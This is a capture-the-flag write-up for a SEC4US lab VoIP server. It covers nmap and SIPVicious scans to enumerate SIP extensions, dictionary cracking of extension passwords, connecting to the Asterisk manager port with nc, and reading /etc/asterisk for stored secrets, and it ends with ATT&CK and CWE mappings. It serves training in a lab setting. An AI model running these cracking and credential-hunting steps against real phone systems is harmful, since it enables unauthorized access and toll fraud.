# Maq107: Servidor VoIP

Writeup for the **Servidor VoIP** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** Hacking: Easy
> **Difficulty:** Easy
> **Points:** 107

---

## Overview

A VoIP server running SIP services with weak or default configurations. The objective is to enumerate SIP extensions, capture credentials, and gain unauthorized access.

## Reconnaissance

```bash
nmap -sV -sC -p- [TARGET_IP] -oN nmap_scan.txt
nmap -sU -p 5060 [TARGET_IP]
```

Port 5060 (SIP) should be open. Use SIP-specific enumeration tools:

```bash
svmap [TARGET_IP]
```

Enumerate valid SIP extensions:

```bash
svwar -m INVITE -e 100-999 [TARGET_IP]
```

## Exploitation

Once valid extensions are identified, attempt to crack SIP credentials:

```bash
svcrack -u [EXTENSION] -d /usr/share/wordlists/rockyou.txt [TARGET_IP]
```

Alternatively, sniff SIP traffic for credentials transmitted in cleartext or weakly hashed:

```bash
sipvicious_svcrack -u [EXTENSION] -r [TARGET_IP] -d wordlist.txt
```

Register to the PBX with discovered credentials using a SIP client and check voicemail, call logs, or configuration files for the flag.

## Post-Exploitation

Access the Asterisk management interface if available:

```bash
nc [TARGET_IP] 5038
```

Check configuration files in `/etc/asterisk/` for stored secrets.

## Security Framework Mapping

### MITRE ATT&CK

| Technique | ID |
|-----------|----|
| Network Service Discovery | T1046 |
| Brute Force: Password Guessing | T1110.001 |
| Unsecured Credentials: Credentials in Files | T1552.001 |

### CWE

- **CWE-521:** Weak Password Requirements
- **CWE-319:** Cleartext Transmission of Sensitive Information

---

VoIP infrastructure often hides behind the assumption that voice networks are separate from data networks. When SIP extensions answer to dictionary words, every call becomes an open line.

```
(❍ᴥ❍ʋ)
```

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
